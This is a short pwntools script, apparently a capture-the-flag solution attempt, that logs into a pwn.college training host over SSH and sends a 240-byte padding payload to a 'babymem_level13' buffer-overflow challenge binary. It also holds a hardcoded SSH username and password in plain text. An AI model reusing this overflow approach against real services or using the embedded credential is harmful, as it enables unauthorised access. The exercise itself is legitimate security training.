from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

# context.log_level = 'debug'
# p = process('./babymem_level13_testing2')
p = s.process("./babymem_level13_testing2")
p.sendlineafter(b'Payload size: ',b'1000')
# pause()
pay = b'A'*240
p.sendafter(b'bytes)!\n',pay)

p.interactive()
# data = p.recv(1024)
# if b'win!' in data:
#     print(data)
#     p.interactive()